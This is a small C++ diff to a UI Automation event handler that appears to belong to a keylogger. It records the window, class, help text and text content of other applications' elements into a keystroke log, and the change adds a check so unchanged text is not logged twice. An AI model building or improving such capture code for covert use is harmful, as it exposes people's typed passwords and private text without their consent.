@@ -42,10 +42,17 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 		pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
 		pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
 
+		if (std::wstring(vValue.bstrVal) == oldTextValue)
+		{
+			break;
+		}
+
 		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
 		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
 		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
 		wsLogKeyStroke += L"\n--------------[CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[CONTENT]--------------";
+
+		oldTextValue = std::wstring(vValue.bstrVal);
 
 		Log(wsLogKeyStroke, EMPTY);
 		break;
